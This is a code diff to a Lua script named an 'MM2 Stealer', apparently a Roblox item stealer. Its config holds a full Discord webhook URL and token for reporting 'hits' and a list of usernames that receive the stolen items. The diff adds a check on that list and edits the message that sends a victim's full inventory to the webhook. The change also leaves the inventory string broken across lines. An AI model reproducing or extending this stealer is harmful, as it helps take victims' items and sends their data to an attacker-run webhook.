@@ -1,4 +1,5 @@
 Config = {
+    Receivers = {"123123", "123123123"}, -- Your Username/s.
     Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b", -- Your webhook for hits.
     FullInventory = true, -- If true, it will display all of the player's items.
 }
@@ -35,6 +36,11 @@ local success, errorMsg = pcall(function()
     if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
         sendnotification("Invalid 'Webhook' url!")
         InvaildWebhook = true
+        return
+    end
+    
+    if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
+        sendnotification("Invalid 'Receivers' table!")
         return
     end
     
@@ -99,7 +105,9 @@ local success, errorMsg = pcall(function()
         embeds = {
             {
                 title = "💻 **__"..StealerName.."__ | __MM2 Stealer__**",
-                description = "🎒 **__Inventory__**\n```" .. FullInventory() .. "```",
+                description = "🎒 **__Inventory__**\n
+" .. FullInventory() .. "
+",
                 color = tonumber(0x3365FF),
             }
         }
